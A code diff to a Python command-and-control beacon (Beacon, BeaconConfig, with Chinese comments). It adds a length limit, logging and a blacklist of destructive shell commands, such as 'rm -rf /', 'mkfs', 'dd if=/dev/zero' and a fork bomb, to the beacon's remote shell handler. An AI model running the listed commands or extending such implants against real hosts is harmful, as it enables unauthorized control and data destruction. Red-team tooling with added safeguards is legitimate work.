@@ -22,7 +22,7 @@ import subprocess
 import threading
 import time
 import uuid
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any, Dict, List, Optional
 
@@ -62,6 +62,23 @@ class BeaconConfig(C2Config):
     # 执行配置
     shell_timeout: int = 60  # Shell 命令超时
     max_output_size: int = 10000  # 最大输出大小
+
+    # 命令安全配置
+    command_validation: bool = True  # 是否启用命令验证
+    command_blacklist: frozenset = field(
+        default_factory=lambda: frozenset(
+            {
+                "rm -rf /",
+                "rm -rf /*",
+                "mkfs",
+                "dd if=/dev/zero",
+                ":(){ :|:& };:",
+                "format c:",
+                "> /dev/sda",
+            }
+        )
+    )
+    max_command_length: int = 4096  # 命令最大长度
 
     def __post_init__(self):
         """初始化后处理"""
@@ -615,6 +632,27 @@ class Beacon(BaseC2):
 
     def _handle_shell(self, command: str) -> str:
         """执行 Shell 命令"""
+        # 命令验证
+        if self.config.command_validation:
+            if len(command) > self.config.max_command_length:
+                logger.warning(
+                    "命令超过长度限制: %d > %d",
+                    len(command),
+                    self.config.max_command_length,
+                )
+                return (
+                    f"[Error] Command too long"
+                    f" ({len(command)} > {self.config.max_command_length})"
+                )
+
+            cmd_lower = command.lower().strip()
+            for blocked in self.config.command_blacklist:
+                if blocked in cmd_lower:
+                    logger.warning("命令匹配黑名单规则: %s", blocked)
+                    return "[Error] Command blocked by security policy"
+
+        logger.info("Beacon 执行命令: %s", command[:100])  # 只记录前100字符
+
         try:
             if platform.system() == "Windows":
                 result = subprocess.run(
